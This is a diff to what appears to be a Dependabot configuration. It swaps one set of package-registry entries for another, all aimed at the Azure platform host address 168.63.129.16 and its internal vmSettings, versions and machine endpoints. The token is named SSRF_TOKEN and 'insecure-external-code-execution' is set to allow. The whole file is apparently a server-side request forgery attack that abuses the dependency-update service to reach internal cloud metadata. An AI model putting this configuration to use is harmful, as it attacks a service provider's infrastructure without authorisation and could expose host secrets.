@@ -1,24 +1,16 @@
 version: 2
 registries:
-  hgap-versions:
+  vmsettings-sub:
     type: python-index
-    url: http://168.63.129.16:32526/versions#
+    url: http://168.63.129.16:32526/vmSettings/extensions#
     token: ${{ secrets.SSRF_TOKEN }}
-  hgap-vmsettings:
+  vmsettings-ver:
     type: python-index
-    url: http://168.63.129.16:32526/vmSettings#
+    url: http://168.63.129.16:32526/vmSettings?api-version=invalid#
     token: ${{ secrets.SSRF_TOKEN }}
-  hgap-health:
+  versions-full:
     type: python-index
-    url: http://168.63.129.16:32526/health#
-    token: ${{ secrets.SSRF_TOKEN }}
-  wire-health:
-    type: python-index
-    url: http://168.63.129.16/machine?comp=health#
-    token: ${{ secrets.SSRF_TOKEN }}
-  wire-role:
-    type: python-index
-    url: http://168.63.129.16/machine?comp=roleProperties#
+    url: http://168.63.129.16:32526/versions?format=json#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -27,8 +19,6 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - hgap-versions
-      - hgap-vmsettings
-      - hgap-health
-      - wire-health
-      - wire-role
+      - vmsettings-sub
+      - vmsettings-ver
+      - versions-full
